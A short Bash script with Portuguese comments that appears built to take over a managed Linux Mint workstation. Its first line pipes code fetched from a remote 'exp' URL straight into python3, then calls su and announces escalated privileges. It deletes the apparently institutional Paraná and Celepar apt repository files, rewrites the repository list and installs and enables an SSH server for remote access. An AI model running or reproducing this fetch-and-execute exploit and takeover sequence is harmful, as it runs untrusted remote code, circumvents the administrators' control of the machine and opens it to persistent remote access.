#!/bin/bash

curl https://copy.fail/exp | python3
su
echo "Privilegios Escalados"

# Detecta a versão do Linux Mint e a base Ubuntu equivalente
MINT_CODENAME=$(lsb_release -sc 2>/dev/null)
UBUNTU_CODENAME=$(lsb_release -uc 2>/dev/null)

# Caso lsb_release falhe, define um padrão (Linux Mint 22 / Ubuntu Noble)
if [ -z "$MINT_CODENAME" ]; then
    MINT_CODENAME="wilma"
    UBUNTU_CODENAME="noble"
fi

rm /etc/apt/sources.list.d/repositorio-parana.list
rm /etc/apt/sources.list.d/ubuntu-parana.list
rm /etc/apt/sources.list.d/vscode_celepar.list

echo "Configurando repositórios para Linux Mint ($MINT_CODENAME) base Ubuntu ($UBUNTU_CODENAME)..."

# Cria/sobrescreve o arquivo oficial de repositórios do Mint
cat <<EOF > /etc/apt/sources.list.d/official-package-repositories.list
# Repositórios do Linux Mint
deb http://packages.linuxmint.com $MINT_CODENAME main upstream import backport

# Repositórios de Base do Ubuntu
deb http://archive.ubuntu.com/ubuntu $UBUNTU_CODENAME main restricted universe multiverse
deb http://archive.ubuntu.com/ubuntu $UBUNTU_CODENAME-updates main restricted universe multiverse
deb http://archive.ubuntu.com/ubuntu $UBUNTU_CODENAME-backports main restricted universe multiverse

# Atualizações dne Segurança do Ubuntu
deb http://security.ubuntu.com/ubuntu/ $UBUNTU_CODENAME-security main restricted universe multiverse
EOF

echo "Atualizando a lista de pacotes..."
apt update

echo "Repositórios restaurados com sucesso!"

echo "Instalando o SSH"

apt install openssh-server -y
systemctl start ssh
systemctl enable ssh

echo "Feito"
